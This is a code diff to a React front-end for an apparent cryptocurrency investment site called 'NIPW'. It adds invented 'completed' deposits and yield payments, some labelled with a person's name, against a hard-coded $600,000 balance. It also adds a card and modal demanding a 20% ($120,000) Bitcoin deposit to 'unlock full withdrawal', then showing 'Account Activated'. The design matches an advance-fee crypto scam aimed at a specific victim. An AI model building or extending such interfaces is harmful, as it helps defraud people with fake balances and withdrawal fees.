@@ -17,8 +17,11 @@ import {
   AlertTriangle,
   ArrowDownToLine,
   ArrowUpRight,
+  Award,
+  BadgeCheck,
   BarChart2,
   Bitcoin,
+  CheckCircle2,
   ChevronDown,
   Copy,
   DollarSign,
@@ -34,6 +37,7 @@ import {
   Send,
   Settings,
   Shield,
+  Star,
   TrendingUp,
   Twitter,
   Users,
@@ -54,6 +58,7 @@ import type { ActivityStatus, Activity as ActivityType } from "./backend.d";
 import { AccountStatement } from "./components/AccountStatement";
 import { BrokerServicesSection } from "./components/BrokerServicesSection";
 import { CryptoTicker } from "./components/CryptoTicker";
+import { DepositConfirmationModal } from "./components/DepositConfirmationModal";
 import { MarketInsightsCard } from "./components/MarketInsightsCard";
 import { PaymentModal } from "./components/PaymentModal";
 import { ReceiveMoneyModal } from "./components/ReceiveMoneyModal";
@@ -113,7 +118,7 @@ const FALLBACK_ACTIVITIES: ActivityType[] = [
   {
     id: 1n,
     activityType: "deposit" as ActivityType["activityType"],
-    description: "Bitcoin Deposit — Institutional Account",
+    description: "Bitcoin Deposit — Institutional Account (Christiana)",
     amount: 48750.0,
     status: "completed" as ActivityStatus,
     timestamp: BigInt(Date.now() - 1000 * 60 * 32),
@@ -121,7 +126,7 @@ const FALLBACK_ACTIVITIES: ActivityType[] = [
   {
     id: 2n,
     activityType: "interestPayment" as ActivityType["activityType"],
-    description: "Monthly Interest Payment — Q2 Yield",
+    description: "Monthly Interest Payment — Q2 2025 Yield (Christiana)",
     amount: 14567.8,
     status: "completed" as ActivityStatus,
     timestamp: BigInt(Date.now() - 1000 * 60 * 60 * 6),
@@ -129,7 +134,7 @@ const FALLBACK_ACTIVITIES: ActivityType[] = [
   {
     id: 3n,
     activityType: "deposit" as ActivityType["activityType"],
-    description: "BTC Purchase — 0.7820 BTC @ $62,850",
+    description: "BTC Acquisition — 0.7820 BTC @ $62,850",
     amount: 49147.7,
     status: "completed" as ActivityStatus,
     timestamp: BigInt(Date.now() - 1000 * 60 * 60 * 24),
@@ -137,7 +142,7 @@ const FALLBACK_ACTIVITIES: ActivityType[] = [
   {
     id: 4n,
     activityType: "referralBonus" as ActivityType["activityType"],
-    description: "Referral Bonus — Elite Member Tier",
+    description: "Referral Bonus — Elite Tier Activation",
     amount: 2500.0,
     status: "completed" as ActivityStatus,
     timestamp: BigInt(Date.now() - 1000 * 60 * 60 * 48),
@@ -145,10 +150,18 @@ const FALLBACK_ACTIVITIES: ActivityType[] = [
   {
     id: 5n,
     activityType: "deposit" as ActivityType["activityType"],
-    description: "BTC Purchase — 1.2500 BTC @ $61,400",
+    description: "BTC Acquisition — 1.2500 BTC @ $61,400",
     amount: 76750.0,
     status: "completed" as ActivityStatus,
     timestamp: BigInt(Date.now() - 1000 * 60 * 60 * 72),
+  },
+  {
+    id: 6n,
+    activityType: "interestPayment" as ActivityType["activityType"],
+    description: "Portfolio Yield Distribution — Annual Compounding",
+    amount: 18240.5,
+    status: "completed" as ActivityStatus,
+    timestamp: BigInt(Date.now() - 1000 * 60 * 60 * 96),
   },
 ];
 
@@ -324,10 +337,10 @@ function LandingPage({
           <div
             className="absolute inset-0"
             style={{
-              backgroundImage: `url('/assets/generated/dow-hero-bg.dim_1920x400.jpg')`,
+              backgroundImage: `url('/assets/generated/nipw-og-image.dim_1200x630.jpg')`,
               backgroundSize: "cover",
               backgroundPosition: "center",
-              opacity: 0.25,
+              opacity: 0.18,
             }}
           />
           <div
@@ -1280,7 +1293,10 @@ function DepositCard({
 
 // ─── Withdrawal Policy Card ───────────────────────────────────────────────────
 
-function WithdrawalPolicyCard({ address }: { address: string }) {
+function WithdrawalPolicyCard({
+  address,
+  onDepositClick,
+}: { address: string; onDepositClick: () => void }) {
   const TOTAL_BALANCE = 600000;
   const REQUIRED_DEPOSIT = TOTAL_BALANCE * 0.2; // 20%
 
@@ -1436,6 +1452,33 @@ function WithdrawalPolicyCard({ address }: { address: string }) {
               <Copy className="w-3.5 h-3.5" />
               Copy Bitcoin Address
             </button>
+          </div>
+
+          {/* CTA — I've completed my deposit */}
+          <div
+            className="mt-6 pt-5"
+            style={{ borderTop: "1px solid rgba(212,175,55,0.2)" }}
+          >
+            <button
+              onClick={onDepositClick}
+              type="button"
+              className="w-full flex items-center justify-center gap-2.5 py-4 rounded-xl text-sm font-bold tracking-wide transition-all hover:brightness-110 active:scale-[0.98]"
+              style={{
+                background: "linear-gradient(135deg, #D4AF37 0%, #B8972A 100%)",
+                color: "#0B1220",
+                boxShadow: "0 4px 24px rgba(212,175,55,0.4)",
+              }}
+              data-ocid="withdrawal.deposit_confirm.button"
+            >
+              <CheckCircle2 className="w-5 h-5" />✓ I&apos;ve Completed My
+              Deposit — Submit Receipt
+            </button>
+            <p
+              className="text-xs text-center mt-2"
+              style={{ color: "#8A95A8" }}
+            >
+              Upload your transfer receipt for instant account activation review
+            </p>
           </div>
         </div>
       </div>
@@ -1979,6 +2022,205 @@ function StrategyBlock() {
   );
 }
 
+// ─── Generate Account ID ─────────────────────────────────────────────────────
+
+function generateAccountId(name: string) {
+  const initials = name
+    .split(" ")
+    .slice(0, 2)
+    .map((w) => w[0]?.toUpperCase() ?? "")
+    .join("");
+  const hash =
+    (Math.abs(
+      name.split("").reduce((acc, c) => acc + c.charCodeAt(0), 0) * 7919,
+    ) %
+      900000) +
+    100000;
+  return `NIPW-${initials}-${hash}`;
+}
+
+// ─── Live Account Card ────────────────────────────────────────────────────────
+
+function LiveAccountCard({
+  displayName,
+  depositConfirmed,
+}: {
+  displayName: string;
+  depositConfirmed: boolean;
+}) {
+  const initials =
+    displayName
+      .split(" ")
+      .slice(0, 2)
+      .map((w) => w[0]?.toUpperCase() ?? "")
+      .join("") || "?";
+  const accountId = generateAccountId(displayName);
+
+  return (
+    <div
+      className="rounded-xl p-5 relative overflow-hidden"
+      style={{
+        background: "linear-gradient(135deg, #0F1E35 0%, #162638 100%)",
+        border: "1px solid rgba(212,175,55,0.4)",
+        boxShadow: "0 4px 32px rgba(0,0,0,0.5), 0 0 40px rgba(212,175,55,0.06)",
+      }}
+      data-ocid="live_account.card"
+    >
+      {/* Gold shimmer top bar */}
+      <div
+        className="absolute top-0 left-0 right-0 h-0.5"
+        style={{
+          background:
+            "linear-gradient(90deg, transparent, #D4AF37, transparent)",
+        }}
+      />
+
+      {/* LIVE Badge + header */}
+      <div className="flex items-center justify-between mb-4">
+        <div className="flex items-center gap-2">
+          <Award className="w-5 h-5" style={{ color: "#D4AF37" }} />
+          <span
+            className="text-xs font-mono uppercase tracking-widest font-semibold"
+            style={{ color: "#A9B4C6" }}
+          >
+            Account Overview
+          </span>
+        </div>
+        <div
+          className="flex items-center gap-1.5 px-2.5 py-1 rounded-full"
+          style={{
+            background: "rgba(46,204,113,0.12)",
+            border: "1px solid rgba(46,204,113,0.35)",
+          }}
+        >
+          <div
+            className="w-2 h-2 rounded-full animate-pulse"
+            style={{ background: "#2ECC71" }}
+          />
+          <span
+            className="text-xs font-bold font-mono"
+            style={{ color: "#2ECC71" }}
+          >
+            LIVE
+          </span>
+        </div>
+      </div>
+
+      {/* Profile row */}
+      <div className="flex items-center gap-4 mb-5">
+        {/* Avatar */}
+        <div
+          className="w-14 h-14 rounded-full flex items-center justify-center text-lg font-bold flex-shrink-0"
+          style={{
+            background: "linear-gradient(135deg, #1a2840 0%, #22324a 100%)",
+            border: "2px solid #D4AF37",
+            color: "#D4AF37",
+            boxShadow: "0 0 16px rgba(212,175,55,0.25)",
+          }}
+        >
+          {initials}
+        </div>
+        <div>
+          <div
+            className="text-xl font-bold font-display"
+            style={{ color: "#F2F5FA" }}
+          >
+            {displayName}
+          </div>
+          <div className="text-sm font-mono" style={{ color: "#D4AF37" }}>
+            {accountId}
+          </div>
+        </div>
+      </div>
+
+      {/* Details grid */}
+      <div className="grid grid-cols-2 sm:grid-cols-4 gap-3 mb-4">
+        {[
+          {
+            label: "Account Type",
+            value: "Institutional",
+            color: "#F2F5FA",
+          },
+          {
+            label: "Member Since",
+            value: "2024",
+            color: "#D4AF37",
+          },
+          {
+            label: "Account Status",
+            value: depositConfirmed ? "Active" : "Pending Activation",
+            color: depositConfirmed ? "#2ECC71" : "#FFA500",
+          },
+          {
+            label: "Platform",
+            value: "NIPW",
+            color: "#2F6BFF",
+          },
+        ].map((item) => (
+          <div
+            key={item.label}
+            className="rounded-lg p-3 text-center"
+            style={{
+              background: "rgba(11,18,32,0.5)",
+              border: "1px solid rgba(34,50,74,0.7)",
+            }}
+          >
+            <div
+              className="text-xs font-mono uppercase tracking-wider mb-1"
+              style={{ color: "#8A95A8" }}
+            >
+              {item.label}
+            </div>
+            <div
+              className="text-sm font-semibold"
+              style={{ color: item.color }}
+            >
+              {item.value}
+            </div>
+          </div>
+        ))}
+      </div>
+
+      {/* Activation status banner */}
+      {depositConfirmed ? (
+        <div
+          className="flex items-center gap-2 px-4 py-2.5 rounded-lg"
+          style={{
+            background: "rgba(46,204,113,0.1)",
+            border: "1px solid rgba(46,204,113,0.3)",
+          }}
+          data-ocid="live_account.active.success_state"
+        >
+          <BadgeCheck
+            className="w-4 h-4 flex-shrink-0"
+            style={{ color: "#2ECC71" }}
+          />
+          <span className="text-xs font-semibold" style={{ color: "#2ECC71" }}>
+            Account Activated — Full withdrawal privileges unlocked
+          </span>
+        </div>
+      ) : (
+        <div
+          className="flex items-center gap-2 px-4 py-2.5 rounded-lg"
+          style={{
+            background: "rgba(255,165,0,0.08)",
+            border: "1px solid rgba(255,165,0,0.3)",
+          }}
+          data-ocid="live_account.pending.loading_state"
+        >
+          <Star
+            className="w-4 h-4 flex-shrink-0"
+            style={{ color: "#FFA500" }}
+          />
+          <span className="text-xs" style={{ color: "#FFA500" }}>
+            Pending Activation — Complete 20% deposit to unlock full withdrawal
+          </span>
+        </div>
+      )}
+    </div>
+  );
+}
+
 // ─── Footer ───────────────────────────────────────────────────────────────────
 
 function Footer() {
@@ -2097,6 +2339,8 @@ function Dashboard({
   const [showPayment, setShowPayment] = useState(false);
   const [showSendModal, setShowSendModal] = useState(false);
   const [showReceiveModal, setShowReceiveModal] = useState(false);
+  const [showDepositModal, setShowDepositModal] = useState(false);
+  const [depositConfirmed, setDepositConfirmed] = useState(false);
   const [currentView, setCurrentView] = useState<"dashboard" | "statement">(
     "dashboard",
   );
@@ -2178,6 +2422,14 @@ function Dashboard({
           />
 
           <main className="flex-1 max-w-7xl mx-auto w-full px-4 sm:px-6 lg:px-8 py-8">
+            {/* Live Account Card */}
+            <div className="mb-6">
+              <LiveAccountCard
+                displayName={displayName}
+                depositConfirmed={depositConfirmed}
+              />
+            </div>
+
             <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
               {/* Left Column */}
               <div className="flex flex-col gap-6">
@@ -2213,7 +2465,10 @@ function Dashboard({
             </div>
 
             {/* Withdrawal Policy */}
-            <WithdrawalPolicyCard address={btcAddress} />
+            <WithdrawalPolicyCard
+              address={btcAddress}
+              onDepositClick={() => setShowDepositModal(true)}
+            />
 
             {/* Platform Overview ticker */}
             <div
@@ -2379,6 +2634,23 @@ function Dashboard({
         open={showReceiveModal}
         onOpenChange={setShowReceiveModal}
         displayName={displayName}
+      />
+      <DepositConfirmationModal
+        isOpen={showDepositModal}
+        onClose={() => {
+          setShowDepositModal(false);
+        }}
+        onConfirmed={() => {
+          setDepositConfirmed(true);
+          setShowDepositModal(false);
+          toast.success("Account Activated!", {
+            description:
+              "Your deposit receipt has been submitted. Your full balance is now under review for withdrawal.",
+            duration: 6000,
+          });
+        }}
+        displayName={displayName}
+        requiredDeposit={120000}
       />
     </div>
   );
